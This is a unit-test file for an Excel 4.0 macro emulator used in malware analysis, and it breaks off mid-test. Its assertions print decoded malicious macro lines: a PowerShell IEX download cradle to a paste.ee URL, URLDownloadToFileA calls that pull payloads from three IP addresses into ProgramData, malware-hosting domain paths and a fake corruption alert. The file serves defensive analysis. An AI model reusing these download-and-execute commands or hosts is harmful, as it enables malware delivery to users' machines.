from __future__ import annotations

import time
import unittest

from refinery.lib.excel import synthesize_formula
from refinery.lib.excel.formula.model import XlNumber
from refinery.lib.scripts.xlm import XlmCursor, XlmEngine, XlmReference, XlmValue, XlmView
from refinery.lib.scripts.xlm.names import XlmNameEntry
from refinery.lib.scripts.xlm.trace import XlmSeverity, XlmStatus
from test import TestBase
from test.lib.excel.samples import (
    XLM_MACRO_ASSIGN_BIFF8,
    XLM_MACRO_FORMULA_XLSM,
    XLM_MACRO_NAMES_BIFF8,
    XLM_MACRO_RPN_BIFF8,
    XLM_MACRO_TEXT_XLSM,
)
from test.lib.scripts.xlm.modify import (
    add_defined_name,
    date_cell,
    drop_defined_names,
    replace_cell_element,
    replace_cell_formula,
)

_MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'


def _macrosheet(view: XlmView, name: str):
    sheet = view.macrosheet(name)
    assert sheet is not None
    return sheet


def _run(
    *replacements: tuple[str, str],
    data: bytes = XLM_MACRO_TEXT_XLSM,
    start: str = '',
    **options,
):
    for cell, formula in replacements:
        data = replace_cell_formula(data, cell, formula)
    engine = XlmEngine(XlmView(data), **options)
    return list(engine.run(start)), engine


def _steps(*replacements: tuple[str, str], **options) -> list:
    return _run(*replacements, **options)[0]


def _value(engine: XlmEngine, row: int, col: int):
    cell = engine.view.cell('Doc1', row, col)
    assert cell is not None
    return cell.value


def _rows(steps) -> list[int]:
    return [step.row for step in steps if step.sheet == 'Doc1' and step.col == 52]


_PROGRAM_ROWS = [109, 110, 112, 113, 114, 115, 116, 118, 120, 121]


class TestXlmEngineEntries(TestBase):

    _ANCHORS = [
        (XLM_MACRO_RPN_BIFF8, 'mP9mScF1m5', 41, 19),
        (XLM_MACRO_NAMES_BIFF8, 'Acf444', 9591, 1),
        (XLM_MACRO_ASSIGN_BIFF8, 'sod', 25268, 148),
        (XLM_MACRO_TEXT_XLSM, 'Doc1', 109, 52),
        (XLM_MACRO_FORMULA_XLSM, 'PCWV', 8, 7),
    ]

    def test_every_run_starts_at_the_fall_through_anchor_of_its_entry_name(self):
        for data, sheet, row, col in self._ANCHORS:
            with self.subTest(sheet=sheet):
                steps = list(XlmEngine(XlmView(data)).run())
                self.assertNotEqual(steps, [])
                self.assertEqual(
                    (steps[0].sheet, steps[0].row, steps[0].col),
                    (sheet, row, col),
                )

    def test_the_run_of_the_maldoc_starts_at_its_program(self):
        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
        self.assertEqual(
            (steps[0].sheet, steps[0].row, steps[0].col, steps[0].text),
            ('Tiposa', 25, 7, 'GOTO(Vtreytr!F17)'),
        )


class TestXlmEngineTraces(TestBase):

    def test_the_names_sample_answers_one_partial_step(self):
        steps = list(XlmEngine(XlmView(XLM_MACRO_NAMES_BIFF8)).run())
        self.assertEqual(len(steps), 1)
        self.assertEqual(steps[0].status, XlmStatus.PartialEvaluation)
        self.assertEqual(
            steps[0].text,
            '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
        )

    def test_the_rpn_sample_walks_its_column_one_row_at_a_time(self):
        steps = list(XlmEngine(XlmView(XLM_MACRO_RPN_BIFF8)).run())
        self.assertEqual([(step.sheet, step.row, step.col) for step in steps], [
            ('mP9mScF1m5', row, 19) for row in range(41, 52)
        ] + [
            ('mP9mScF1m5', row, 20) for row in (1, 3, 4, 5, 6, 7, 8, 9, 10)
        ])
        self.assertEqual(
            [step.status for step in steps],
            [XlmStatus.FullEvaluation] * 9
            + [XlmStatus.PartialEvaluation, XlmStatus.FullEvaluation]
            + [XlmStatus.FullEvaluation] * 6
            + [XlmStatus.PartialEvaluation, XlmStatus.FullEvaluation]
            + [XlmStatus.End],
        )
        self.assertEqual(steps[10].severity, XlmSeverity.JUMP)
        self.assertEqual(steps[10].text, 'GOTO(T1)')
        self.assertEqual(steps[-1].text, 'CLOSE(FALSE)')

    def test_the_rpn_sample_executes_the_formulas_its_own_column_writes(self):
        # the ten writes the sample performs install executable trees, so the run does not end
        # at the jump target but walks the written column until the CLOSE it wrote there
        steps = list(XlmEngine(XlmView(XLM_MACRO_RPN_BIFF8)).run())
        self.assertEqual(steps[11].row, 1)
        self.assertEqual(steps[11].text, 'IF(GET.WORKSPACE(13)<770,CLOSE(FALSE),)')
        self.assertEqual(steps[17].text, '=ALERT('
            '"The workbook cannot be opened or repaired by Microsoft Excel because it\'s '
            'corrupt.",2)')

    def test_the_assign_sample_enters_through_a_cell_call(self):
        steps = list(XlmEngine(XlmView(XLM_MACRO_ASSIGN_BIFF8)).run())
        self.assertNotEqual(steps, [])
        self.assertEqual(
            (steps[0].row, steps[0].col, steps[0].text),
            (25268, 148, '$DQ$42603()'),
        )
        self.assertEqual((steps[1].row, steps[1].col), (42603, 121))
        self.assertEqual(steps[-1].status, XlmStatus.End)
        self.assertEqual(steps[-1].text, 'HALT()')

    def test_the_maldoc_run_ends_at_its_return(self):
        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
        self.assertEqual(
            [step.status for step in steps if step.status is XlmStatus.Error],
            [],
        )
        self.assertEqual(
            (steps[-1].sheet, steps[-1].row, steps[-1].col, steps[-1].text),
            ('Tiposa1', 30, 7, 'RETURN()'),
        )

    def test_the_maldoc_run_spells_the_paths_it_downloads(self):
        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
        self.assertEqual(
            [
                (step.sheet, step.row)
                for step in steps
                if 'Ropedjo1.ocx' in step.text
            ],
            [('Xwtrd', 21), ('Tiposa1', 22)],
        )

    def test_every_download_of_the_maldoc_names_the_one_number_its_program_drew(self):
        steps = list(XlmEngine(XlmView(self.download_sample(_MALDOC))).run())
        number = next(
            step.text
            for step in steps
            if (step.sheet, step.row, step.col) == ('Tiposa1', 11, 7)
        )
        self.assertEqual(
            [
                step.text
                for step in steps
                if 'URLDownloadToFileA(0,' in step.text
            ],
            [
                '=uRlMon.URLDownloadToFileA(0,'
                F'"http://94.140.112.209/{number}.dat","C:\\ProgramData\\Ropedjo1.ocx",0,0)',
                '=uRlMon.URLDownloadToFileA(0,'
                F'"http://185.190.80.172/{number}.dat","C:\\ProgramData\\Ropedjo2.ocx",0,0)',
                '=uRlMon.URLDownloadToFileA(0,'
                F'"http://111.90.150.43/ {number}.dat","C:\\ProgramData\\Ropedjo3.ocx",0,0)',
            ],
        )


class TestXlmEngineControl(TestBase):

    def test_a_goto_moves_execution_to_the_address_it_names(self):
        steps = _steps(('AZ110', 'GOTO(AZ118)'))
        self.assertEqual(
            [step.row for step in steps if step.col == 52],
            [109, 110, 118, 120, 121],
        )
        self.assertEqual(steps[1].severity, XlmSeverity.JUMP)
        self.assertEqual(steps[1].status, XlmStatus.FullEvaluation)

    def test_a_goto_that_jumps_to_itself_terminates_by_loop_detection(self):
        steps = _steps(('AZ110', 'GOTO(AZ110)'))
        self.assertEqual(steps[0].row, 109)
        self.assertEqual(steps[0].status, XlmStatus.FullEvaluation)
        self.assertEqual(steps[0].text, 'SET.VALUE(BD108,"URLMo")')
        self.assertEqual([step.text for step in steps[1:]], ['GOTO(AZ110)'] * 1018)
        self.assertEqual(
            [step.status for step in steps[1:]],
            [XlmStatus.FullEvaluation] * 1018,
        )

    def test_a_while_whose_condition_does_not_hold_ignores_the_rest_of_the_column(self):
        steps = _steps(('AZ110', 'WHILE(FALSE)'))
        self.assertEqual(
            [(step.row, step.col) for step in steps],
            [(109, 52), (110, 52)],
        )
        self.assertEqual(steps[1].text, 'WHILE(FALSE)')
        self.assertEqual(steps[1].status, XlmStatus.FullEvaluation)
        self.assertEqual(steps[1].severity, XlmSeverity.IMPORTANT)

    def test_a_for_cell_loop_walks_its_range_until_its_next_falls_through(self):
        steps, engine = _run(
            ('AZ110', 'FOR.CELL("counter",AZ109:AZ112)'),
            ('AZ112', 'NEXT()'),
        )
        self.assertEqual(
            [step.row for step in steps if step.col == 52],
            [109] + [110, 112] * 3 + [110, 113, 114, 115, 116, 118, 120, 121],
        )
        entry = engine.view.names.resolve('counter')
        assert entry is not None and entry.formula is not None
        self.assertEqual(synthesize_formula(entry.formula), 'Doc1!$AZ$112')

    def test_an_unknown_command_spells_the_empty_slot_of_a_missing_argument(self):
        steps = _steps(('AZ110', 'FOO(1,,2)'))
        self.assertEqual(steps[1].status, XlmStatus.PartialEvaluation)
        self.assertEqual(steps[1].text, '=FOO(1,,2)')

    def test_a_partial_condition_branches_into_both_arms_in_turn(self):
        steps = _steps(('AZ110', 'IF(AZ112,1+1,2+2)'))
        texts = [step.text for step in steps]
        true_arm = texts.index('[TRUE] 2')
        false_arm = texts.index('[FALSE] 4')
        self.assertEqual(steps[1].status, XlmStatus.FullBranching)
        self.assertEqual(steps[1].text, 'IF(AZ112,1+1,2+2)')
        self.assertEqual(true_arm, 2)
        self.assertLess(true_arm, false_arm)
        self.assertEqual(steps[true_arm + 1].row, 112)
        self.assertEqual(steps[false_arm + 1].row, 112)
        self.assertEqual(
            [step.row for step in steps[true_arm:false_arm] if step.col == 52],
            [110, 112, 113, 114, 115, 116, 118, 120, 121],
        )
        self.assertEqual(
            [step.row for step in steps[false_arm:] if step.col == 52],
            [110, 112, 113, 114, 115, 116, 118, 120, 121],
        )

    def test_a_false_branch_rolls_back_the_name_its_true_branch_defined(self):
        steps, engine = _run(('AZ110', 'IF(AZ112,SET.NAME("probe",42),1)'))
        self.assertEqual(steps[2].text, '[TRUE] SET.NAME(probe,42)')
        self.assertEqual(engine.view.names.resolve('probe'), None)

    def test_a_set_value_keeps_the_formula_of_the_cell_it_writes(self):
        steps = _steps(('AZ110', 'SET.VALUE(AZ113,"x")'), ('AZ113', 'HALT()'))
        self.assertEqual(_rows(steps), [109, 110, 112, 113])
        self.assertEqual((steps[-1].status, steps[-1].text), (XlmStatus.End, 'HALT()'))

    def test_a_formula_written_to_a_computed_address_runs_there(self):
        steps = _steps(('AZ109', 'FORMULA("=HALT()","Doc1!R"&amp;"113"&amp;"C52")'))
        self.assertEqual(_rows(steps), [109, 110, 112, 113])
        self.assertEqual((steps[-1].status, steps[-1].text), (XlmStatus.End, 'HALT()'))

    def test_a_formula_that_names_no_destination_writes_the_selected_cell(self):
        steps = _steps(('AZ109', 'SELECT(AZ113)'), ('AZ110', 'FORMULA("=HALT()")'))
        self.assertEqual(_rows(steps), [109, 110, 112, 113])
        self.assertEqual((steps[-1].status, steps[-1].text), (XlmStatus.End, 'HALT()'))

    def test_a_loop_inside_a_skipped_body_does_not_end_the_skipping(self):
        steps, engine = _run(
            ('AZ109', 'WHILE(FALSE)'),
            ('AZ110', 'WHILE(TRUE)'),
            ('AZ112', 'SET.VALUE(BD108,"inner")'),
            ('AZ113', 'NEXT()'),
            ('AZ114', 'SET.VALUE(BD109,"outer")'),
            ('AZ115', 'NEXT()'),
            ('AZ116', 'SET.VALUE(BD119,"after")'),
            ('AZ118', 'HALT()'),
        )
        self.assertEqual(_rows(steps), [109, 116, 118])
        self.assertEqual(engine.view.cell('Doc1', 109, 56), None)
        self.assertEqual(_value(engine, 119, 56), 'after')

    def test_a_second_for_cell_loop_walks_its_own_range(self):
        _, engine = _run(
            ('AZ109', 'FOR.CELL("x",BJ116:BJ117)'),
            ('AZ110', 'SET.VALUE(BD108,BD108&amp;x)'),
            ('AZ112', 'NEXT()'),
            ('AZ113', 'FOR.CELL("y",BJ118:BJ119)'),
            ('AZ114', 'SET.VALUE(BD109,BD109&amp;y)'),
            ('AZ115', 'NEXT()'),
            ('AZ116', 'HALT()'),
        )
        self.assertEqual(
            _value(engine, 108, 56),
            'ieclb.com.br/ds/3103.maharaniworld.com/ds/3103.',
        )
        self.assertEqual(
            _value(engine, 109, 56),
            'aycconsultoriaempresarial.com/ds/3103.sgb.ac.ke/ds/3103.',
        )

    def test_an_if_inside_an_expression_takes_the_value_of_the_branch_it_selects(self):
        steps, engine = _run(('AZ109', 'SET.VALUE(BD108,IF(1=1,"x","y"))'))
        self.assertEqual(steps[0].text, 'SET.VALUE(BD108,"x")')
        self.assertEqual(_value(engine, 108, 56), 'x')
        self.assertEqual(_rows(steps), _PROGRAM_ROWS)

    def test_a_macro_call_inside_an_expression_takes_the_value_its_subroutine_returns(self):
        data = replace_cell_element(
            XLM_MACRO_TEXT_XLSM,
            'BH120',
            '<c r="BH120"><f>RETURN("x")</f></c>',
        )
        steps, engine = _run(('AZ109', 'SET.VALUE(BD108,Doc1!BH120()&amp;"y")'), data=data)
        self.assertEqual(_value(engine, 108, 56), 'xy')
        self.assertEqual(
            [(step.row, step.col, step.text) for step in steps[:2]],
            [(120, 60, '"x"'), (109, 52, 'SET.VALUE(BD108,"xy")')],
        )

    def test_a_condition_on_an_unfinished_value_branches_into_both_arms(self):
        steps = _steps(
            ('AZ109', 'GET.DOCUMENT(1)'),
            ('AZ110', 'IF(AZ109&gt;100,CLOSE(FALSE),SET.VALUE(BD108,"go"))'),
        )
        self.assertEqual(steps[0].status, XlmStatus.PartialEvaluation)
        self.assertEqual(steps[1].status, XlmStatus.FullBranching)

    def test_a_false_branch_does_not_inherit_the_loop_its_true_branch_left_open(self):
        steps = _steps(('AZ110', 'IF(GET.CELL(1,A1)=1,WHILE(FALSE),SET.VALUE(BD108,"false"))'))
        self.assertEqual(
            [step.text for step in steps if (step.row, step.col) == (110, 52)],
            [
                'IF(GET.CELL(1,A1)=1,WHILE(FALSE),SET.VALUE(BD108,"false"))',
                '[TRUE] WHILE(FALSE)',
                '[FALSE] SET.VALUE(BD108,"false")',
            ],
        )

    def test_an_arithmetic_overflow_is_an_error_value_the_run_continues_past(self):
        steps, engine = _run(('AZ109', 'SET.VALUE(BD108,10^400)'))
        self.assertEqual(steps[0].text, 'SET.VALUE(BD108,#NUM!)')
        self.assertEqual(_value(engine, 108, 56), '#NUM!')
        self.assertEqual(_rows(steps), _PROGRAM_ROWS)

    def test_a_formula_deeper_than_the_interpreter_stack_evaluates(self):
        letters = [chr(65 + index % 26) for index in range(1200)]
        chain = '&amp;'.join(F'CHAR({ord(letter)})' for letter in letters)
        steps = _steps(('AZ109', F'SET.VALUE(BD108,{chain})'))
        self.assertEqual(steps[0].text, F'SET.VALUE(BD108,"{"".join(letters)}")')
        self.assertEqual(_rows(steps), _PROGRAM_ROWS)

    def test_a_run_that_exceeds_its_step_budget_ends_with_an_error_step(self):
        steps = _steps(
            ('AZ110', 'WHILE(TRUE)'),
            ('AZ112', 'NEXT()'),
            max_steps=10,
        )
        self.assertEqual(len(steps), 11)
        self.assertEqual(steps[-1].status, XlmStatus.Error)
        self.assertEqual(steps[-1].text, 'step budget of 10 exhausted')
        self.assertEqual(steps[-2].text, 'WHILE(TRUE) -> [TRUE]')

    def test_a_goto_loop_that_counts_runs_until_its_condition_fails(self):
        _, engine = _run(
            ('AZ109', 'SET.VALUE(BD108,0)'),
            ('AZ110', 'SET.VALUE(BD108,BD108+1)'),
            ('AZ112', 'IF(BD108&lt;30,GOTO(AZ110),HALT())'),
        )
        self.assertEqual(_value(engine, 108, 56), 30)

    def test_a_goto_loop_that_oscillates_returns_to_its_anchor_and_ends(self):
        steps, engine = _run(
            ('AZ109', 'GOTO(AZ110)'),
            ('AZ110', 'SET.VALUE(BD108,IF(BD108="a","b","a"))'),
            ('AZ112', 'GOTO(AZ110)'),
        )
        self.assertEqual(len(steps), 1020)
        self.assertEqual(steps[-1].status, XlmStatus.FullEvaluation)
        self.assertEqual(_value(engine, 108, 56), 'b')

    def test_a_goto_loop_whose_file_grows_each_pass_runs_to_its_budget(self):
        steps, engine = _run(
            ('AZ109', 'FOPEN("f",3)'),
            ('AZ110', 'FWRITE("f","x")'),
            ('AZ112', 'GOTO(AZ110)'),
            max_steps=4000,
        )
        self.assertEqual(len(steps), 4001)
        self.assertEqual(steps[-1].status, XlmStatus.Error)
        self.assertEqual(steps[-1].text, 'step budget of 4000 exhausted')
        self.assertEqual(engine.files.size('f'), 2000)

    def test_an_if_with_two_arguments_runs_the_arm_its_condition_selects(self):
        _, engine = _run(('AZ110', 'IF(TRUE,SET.VALUE(BD108,"hit"))'))
        self.assertEqual(_value(engine, 108, 56), 'hit')

    def test_an_if_with_two_arguments_answers_false_when_its_condition_fails(self):
        _, engine = _run(('AZ110', 'IF(FALSE,SET.VALUE(BD108,"hit"))'))
        self.assertEqual(_value(engine, 110, 52), False)

    def test_a_block_if_whose_condition_fails_skips_to_its_end_if(self):
        steps = _steps(('AZ110', 'IF(FALSE)'), ('AZ113', 'END.IF()'))
        self.assertEqual(_rows(steps), [109, 110, 113, 114, 115, 116, 118, 120, 121])

    def test_a_block_if_on_a_condition_that_spells_no_truth_value_halts(self):
        steps = _steps(('AZ110', 'IF("junk")'), ('AZ113', 'END.IF()'))
        self.assertEqual(_rows(steps), [109, 110])
        self.assertEqual(steps[1].status, XlmStatus.Error)

    def test_a_block_if_that_holds_runs_its_body_and_skips_the_arm_of_its_else(self):
        steps, engine = _run(
            ('AZ110', 'IF(TRUE)'),
            ('AZ112', 'SET.VALUE(BD205,"body")'),
            ('AZ118', 'ELSE()'),
            ('AZ120', 'SET.VALUE(BD206,"arm")'),
            ('AZ121', 'END.IF()'),
        )
        self.assertEqual(_rows(steps), [109, 110, 112, 113, 114, 115, 116, 118, 121])
        self.assertEqual(_value(engine, 205, 56), 'body')
        self.assertEqual(engine.view.cell('Doc1', 206, 56), None)

    def test_a_block_if_that_fails_runs_the_arm_of_its_else(self):
        steps, engine = _run(
            ('AZ110', 'IF(FALSE)'),
            ('AZ112', 'SET.VALUE(BD205,"body")'),
            ('AZ118', 'ELSE()'),
            ('AZ120', 'SET.VALUE(BD206,"arm")'),
            ('AZ121', 'END.IF()'),
        )
        self.assertEqual(_rows(steps), [109, 110, 118, 120, 121])
        self.assertEqual(engine.view.cell('Doc1', 205, 56), None)
        self.assertEqual(_value(engine, 206, 56), 'arm')

    def test_a_chain_of_else_ifs_runs_the_arm_of_the_one_that_holds(self):
        steps, engine = _run(
            ('AZ110', 'IF(FALSE)'),
            ('AZ112', 'SET.VALUE(BD205,"body")'),
            ('AZ113', 'ELSE.IF(FALSE)'),
            ('AZ114', 'SET.VALUE(BD206,"first")'),
            ('AZ115', 'ELSE.IF(TRUE)'),
            ('AZ116', 'SET.VALUE(BD207,"second")'),
            ('AZ118', 'ELSE()'),
            ('AZ120', 'SET.VALUE(BD208,"arm")'),
            ('AZ121', 'END.IF()'),
        )
        self.assertEqual(_rows(steps), [109, 110, 113, 115, 116, 118, 121])
        self.assertEqual(_value(engine, 207, 56), 'second')
        self.assertEqual(engine.view.cell('Doc1', 206, 56), None)
        self.assertEqual(engine.view.cell('Doc1', 208, 56), None)

    def test_an_else_if_a_completed_arm_falls_onto_branches_no_more(self):
        steps, engine = _run(
            ('AZ110', 'IF(FALSE)'),
            ('AZ112', 'SET.VALUE(BD205,"body")'),
            ('AZ113', 'ELSE.IF(TRUE)'),
            ('AZ114', 'SET.VALUE(BD206,"first")'),
            ('AZ115', 'ELSE.IF(TRUE)'),
            ('AZ116', 'SET.VALUE(BD207,"second")'),
            ('AZ121', 'END.IF()'),
        )
        self.assertEqual(_rows(steps), [109, 110, 113, 114, 115, 121])
        self.assertEqual(_value(engine, 206, 56), 'first')
        self.assertEqual(engine.view.cell('Doc1', 207, 56), None)

    def test_a_block_if_nests_inside_the_body_of_another(self):
        steps, engine = _run(
            ('AZ110', 'IF(TRUE)'),
            ('AZ112', 'SET.VALUE(BD205,"outer")'),
            ('AZ113', 'IF(FALSE)'),
            ('AZ114', 'SET.VALUE(BD206,"inner")'),
            ('AZ115', 'END.IF()'),
            ('AZ116', 'SET.VALUE(BD207,"outer2")'),
            ('AZ118', 'ELSE()'),
            ('AZ120', 'SET.VALUE(BD208,"arm")'),
            ('AZ121', 'END.IF()'),
        )
        self.assertEqual(_rows(steps), [109, 110, 112, 113, 115, 116, 118, 121])
        self.assertEqual(_value(engine, 205, 56), 'outer')
        self.assertEqual(engine.view.cell('Doc1', 206, 56), None)
        self.assertEqual(_value(engine, 207, 56), 'outer2')
        self.assertEqual(engine.view.cell('Doc1', 208, 56), None)

    def test_a_block_if_on_an_unfinished_condition_branches_into_both_arms(self):
        steps, engine = _run(
            ('AZ110', 'IF(AZ113)'),
            ('AZ112', 'SET.VALUE(BD108,"body")'),
            ('AZ114', 'ELSE()'),
            ('AZ115', 'SET.VALUE(BD209,"arm")'),
            ('AZ116', 'END.IF()'),
        )
        self.assertEqual(steps[1].status, XlmStatus.FullBranching)
        self.assertEqual(
            [step.text for step in steps if (step.row, step.col) == (110, 52)],
            ['IF(AZ113)'],
        )
        self.assertEqual(
            [step.text for step in steps if (step.row, step.col) == (112, 52)],
            ['[TRUE] SET.VALUE(BD108,"body")'],
        )
        self.assertEqual(
            [step.text for step in steps if (step.row, step.col) == (114, 52)],
            ['ELSE', '[FALSE] ELSE'],
        )
        self.assertEqual(_value(engine, 209, 56), 'arm')
        self.assertEqual(_value(engine, 108, 56), 'URLMo')

    def test_the_assign_samples_partial_block_if_runs_both_of_its_arms(self):
        steps = list(XlmEngine(XlmView(XLM_MACRO_ASSIGN_BIFF8)).run())
        self.assertEqual(
            [step.row for step in steps if step.sheet == 'sod' and step.col == 148],
            [25268]
            + [14678] * 24
            + [25269, 25270, 25271, 25272, 25273]
            + [25274, 25275, 25276, 25277, 25278, 25279, 25280, 25281, 25282]
            + [25277, 25278, 25279, 25280, 25281, 25282],
        )
        self.assertEqual(
            [step.text for step in steps if (step.sheet, step.row, step.col) == ('sod', 25277, 148)],
            ['END.IF', '[FALSE] END.IF'],
        )

    def test_a_while_on_a_number_other_than_zero_holds(self):
        steps = _steps(('AZ110', 'WHILE(1)'), ('AZ112', 'NEXT()'), max_steps=6)
        self.assertEqual([step.row for step in steps[:6]], [109, 110, 112, 110, 112, 110])

    def test_a_count_over_the_whole_sheet_answers_the_count_over_its_used_cells(self):
        _, engine = _run(
            ('AZ109', 'SET.VALUE(BD108,COUNTA(A1:XFD1048576)-COUNTA(A1:BZ200))'),
        )
        self.assertEqual(_value(engine, 108, 56), 0)

    def test_a_fill_over_the_whole_sheet_ends_at_the_deadline_of_the_run(self):
        steps, engine = _run(
            ('AZ109', 'FORMULA.FILL("x",A1:XFD1048576)'),
            timeout=1,
        )
        self.assertEqual(steps[-1].status, XlmStatus.Error)
        self.assertEqual(steps[-1].text, 'the run exceeded its timeout')

    def test_a_range_over_a_worksheet_counts_the_cells_it_holds(self):
        _, engine = _run(('AZ109', 'SET.VALUE(BD108,COUNTA(Doc2!A1:AZ200))'))
        self.assertEqual(_value(engine, 108, 56), 50)


class TestXlmEngineValues(TestBase):

    def test_a_read_of_a_cell_that_ran_does_not_repeat_its_side_effects(self):
        _, engine = _run(
            ('AZ109', 'FOPEN("f",3)'),
            ('AZ110', 'FWRITE("f","A")'),
            ('AZ112', 'SET.VALUE(BD108,AZ110)'),
            ('AZ113', 'SET.VALUE(BD109,AZ110&amp;AZ110)'),
        )
        self.assertEqual(engine.files.size('f'), 1)

    def test_an_empty_cell_reads_as_the_empty_text(self):
        _, engine = _run(
            ('AZ109', 'FORMULA(BH120,BD108)'),
            ('AZ110', 'SET.VALUE(BD109,LEN(BD108)&amp;MID(BH120,1,2))'),
        )
        self.assertEqual(_value(engine, 108, 56), '')
        self.assertEqual(_value(engine, 109, 56), '0')

    def test_a_value_cell_that_holds_quotes_reads_with_its_quotes(self):
        data = replace_cell_element(
            XLM_MACRO_TEXT_XLSM,
            'BH120',
            '<c r="BH120" t="str"><v>"abc"</v></c>',
        )
        _, engine = _run(('AZ118', 'SET.VALUE(BD119,BH120&amp;"x")'), data=data)
        self.assertEqual(_value(engine, 119, 56), '"abc"x')

    def test_a_computed_text_that_starts_and_ends_with_a_quote_keeps_its_quotes(self):
        _, engine = _run(('AZ109', 'SET.VALUE(BD108,MID("a""x""b",2,3)&amp;"y")'))
        self.assertEqual(_value(engine, 108, 56), '"x"y')

    def test_a_command_result_concatenates_as_the_value_it_computed(self):
        _, engine = _run(
            ('AZ109', 'SET.VALUE(BD108,GET.WORKSPACE(1))'),
            ('AZ110', 'SET.VALUE(BD109,GET.WORKSPACE(1)&amp;"")'),
        )
        self.assertEqual(_value(engine, 109, 56), _value(engine, 108, 56))

    def test_a_truth_value_concatenates_as_excel_spells_it(self):
        _, engine = _run(('AZ109', 'SET.VALUE(BD108,TRUE&amp;"x")'))
        self.assertEqual(_value(engine, 108, 56), 'TRUEx')


class TestXlmEngineNames(TestBase):

    def test_a_set_name_replaces_the_name_scoped_to_the_sheet_that_reads_it(self):
        data = add_defined_name(XLM_MACRO_TEXT_XLSM, 'probe', '"stored"', sheet=1)
        _, engine = _run(
            ('AZ110', 'SET.NAME("probe",42)'),
            ('AZ112', 'SET.VALUE(BD108,probe&amp;"|")'),
            data=data,
        )
        self.assertEqual(_value(engine, 108, 56), '42|')

    def test_a_set_name_that_names_no_value_deletes_the_name(self):
        steps, engine = _run(('AZ109', 'SET.NAME("flag",1)'), ('AZ110', 'SET.NAME("flag")'))
        self.assertEqual(_rows(steps), _PROGRAM_ROWS)
        entry = engine.view.names.resolve('flag')
        assert entry is not None
        self.assertEqual(entry.formula, None)


class TestXlmEngineDayGuess(TestBase):

    def _dated(self, *replacements: tuple[str, str]) -> bytes:
        data = date_cell(XLM_MACRO_TEXT_XLSM, 'AZ113', '2026-10-01T00:00:00')
        for cell, formula in replacements:
            data = replace_cell_formula(data, cell, formula)
        return data

    def test_a_guessed_day_runs_the_same_cells_as_a_given_day(self):
        data = date_cell(XLM_MACRO_TEXT_XLSM, 'BI116', '2026-10-01T00:00:00')
        replacements = (('AZ109', 'DAY(BI116)'), ('AZ110', 'FORMULA("x",AZ112)'))
        guessed, _ = _run(*replacements, data=data)
        given, _ = _run(*replacements, data=data, day=5)
        self.assertEqual(
            [(step.sheet, step.row, step.col) for step in guessed],
            [(step.sheet, step.row, step.col) for step in given],
        )

    def test_the_day_guess_runs_from_the_start_point_of_the_run(self):
        data = self._dated(('AZ110', 'CHAR(DAY(AZ113)*8)'))
        _, named = _run(data=data)
        _, started = _run(data=drop_defined_names(data), start='Doc1!AZ102')
        self.assertEqual(started.day, named.day)

    def test_the_day_guess_runs_within_the_timeout_of_the_run(self):
        data = self._dated(
            ('AZ110', 'DAY(AZ113)'),
            ('AZ112', 'WHILE(TRUE)'),
            ('AZ114', 'SET.VALUE(BD108,CHAR(DAY(AZ113)))'),
            ('AZ115', 'NEXT()'),
        )
        start = time.monotonic()
        steps, _ = _run(data=data, timeout=1)
        # every one of the 31 trials of the guess loops forever, and a trial with a timeout of
        # its own would spend a second on each
        self.assertLess(time.monotonic() - start, 5)
        self.assertEqual(
            (steps[-1].status, steps[-1].text),
            (XlmStatus.Error, 'the run exceeded its timeout'),
        )


class TestXlmEngineJournal(TestBase):

    def test_a_cell_the_program_writes_is_visible_to_the_fall_through(self):
        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
        cursor = XlmCursor('Doc1', 116, 52)
        self.assertEqual(
            engine.next_formula_cell(cursor),
            XlmCursor('Doc1', 118, 52),
        )
        position = engine.snapshot()
        engine.write_cell(XlmReference('Doc1', 117, 52), XlmValue(value='=HALT()'), cursor)
        self.assertEqual(
            engine.next_formula_cell(cursor),
            XlmCursor('Doc1', 117, 52),
        )
        engine.rollback(position)
        self.assertEqual(
            engine.next_formula_cell(cursor),
            XlmCursor('Doc1', 118, 52),
        )

    def test_a_rollback_removes_a_cell_the_rolled_back_writes_created(self):
        view = XlmView(XLM_MACRO_TEXT_XLSM)
        engine = XlmEngine(view)
        position = engine.snapshot()
        engine.write_cell(
            XlmReference('Doc1', 200, 52),
            XlmValue(value='=1+1'),
            XlmCursor('Doc1', 1, 1),
        )
        created = _macrosheet(view, 'Doc1').cell(200, 52)
        assert created is not None
        self.assertEqual(created.value, '=1+1')
        self.assertEqual(
            engine.read_reference(
                XlmReference('Doc1', 200, 52), XlmCursor('Doc1', 1, 1),
            ).value,
            2,
        )
        engine.rollback(position)
        self.assertEqual(_macrosheet(view, 'Doc1').cell(200, 52), None)
        self.assertEqual(
            engine.read_reference(
                XlmReference('Doc1', 200, 52), XlmCursor('Doc1', 1, 1),
            ).value,
            '',
        )

    def test_a_rollback_restores_the_value_and_formula_of_an_overwritten_cell(self):
        view = XlmView(XLM_MACRO_TEXT_XLSM)
        engine = XlmEngine(view)
        cell = view.cell('Doc1', 109, 52)
        assert cell is not None
        self.assertEqual((cell.value, cell.formula is None), (False, False))
        position = engine.snapshot()
        engine.write_cell(
            XlmReference('Doc1', 109, 52),
            XlmValue(value='changed'),
            XlmCursor('Doc1', 1, 1),
        )
        self.assertEqual((cell.value, cell.formula), ('changed', None))
        engine.write_value(cell, XlmValue(value=7))
        self.assertEqual(cell.value, 7)
        engine.rollback(position)
        self.assertEqual((cell.value, cell.formula is None), (False, False))

    def test_a_rollback_undoes_a_name_the_rolled_back_run_defined(self):
        view = XlmView(XLM_MACRO_TEXT_XLSM)
        engine = XlmEngine(view)
        position = engine.snapshot()
        engine.define_name(XlmNameEntry(name='probe', sheet=None, formula=XlNumber(value=42)))
        resolved = view.names.resolve('probe')
        assert resolved is not None and resolved.formula is not None
        self.assertEqual(synthesize_formula(resolved.formula), '42')
        engine.rollback(position)
        self.assertEqual(view.names.resolve('probe'), None)

    def test_a_rollback_restores_the_name_a_rolled_back_run_replaced(self):
        view = XlmView(XLM_MACRO_TEXT_XLSM)
        engine = XlmEngine(view)
        entry = view.names.resolve('auto_open')
        assert entry is not None
        position = engine.snapshot()
        engine.define_name(XlmNameEntry(
            name=entry.name,
            sheet=entry.sheet,
            formula=XlNumber(value=42),
        ))
